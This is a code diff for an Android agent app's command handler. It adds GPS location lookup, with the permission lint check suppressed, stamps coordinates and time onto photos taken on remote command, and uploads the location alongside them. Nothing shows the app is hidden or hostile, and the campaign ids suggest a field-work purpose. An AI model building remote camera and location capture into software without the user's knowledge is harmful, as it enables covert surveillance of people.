@@ -1,8 +1,14 @@
 package com.spaceeye.agent.commands
 
+import android.annotation.SuppressLint
 import android.content.Context
+import android.location.LocationManager
 import android.util.Log
 import com.spaceeye.agent.camera.PhotoCapture
+import com.spaceeye.agent.camera.PhotoWatermark
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 import com.spaceeye.agent.network.ApiClient
 import com.spaceeye.agent.network.RemoteLog
 import com.spaceeye.agent.network.SocketManager
@@ -78,6 +84,20 @@ class CommandHandler(
         }
     }
 
+    // Ubicacion actual (ultima conocida) para estampar en la foto.
+    @SuppressLint("MissingPermission")
+    private fun currentLatLng(): Pair<Double, Double>? {
+        return try {
+            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            if (loc != null) Pair(loc.latitude, loc.longitude) else null
+        } catch (e: Exception) {
+            Log.w(TAG, "location: ${e.message}")
+            null
+        }
+    }
+
     fun handle(cmd: JSONObject) {
         val type = cmd.optString("command_type")
         val id = cmd.optInt("id")
@@ -121,12 +141,27 @@ class CommandHandler(
                         if (photo != null) {
                             Log.d(TAG, "Photo captured: ${photo.size} bytes")
                             RemoteLog.info(ctx, "photo", "Foto capturada (${photo.size / 1024} KB)")
+
+                            // Graba dentro de la foto la ubicacion exacta (GPS) y la
+                            // fecha/hora de captura.
+                            val ll = currentLatLng()
+                            val lines = mutableListOf<String>()
+                            if (ll != null) {
+                                lines.add("Lat ${"%.6f".format(ll.first)}   Lng ${"%.6f".format(ll.second)}")
+                            } else {
+                                lines.add("Ubicacion no disponible")
+                            }
+                            lines.add(SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date()))
+                            val stamped = PhotoWatermark.draw(photo, lines)
+
                             val uploaded = withContext(Dispatchers.IO) {
                                 apiClient.uploadPhoto(
-                                    photoBytes = photo,
+                                    photoBytes = stamped,
                                     commandId = commandId,
                                     campaignId = campaignId,
                                     scheduleId = scheduleId,
+                                    gpsLat = ll?.first,
+                                    gpsLng = ll?.second,
                                     source = "on_demand"
                                 )
                             }
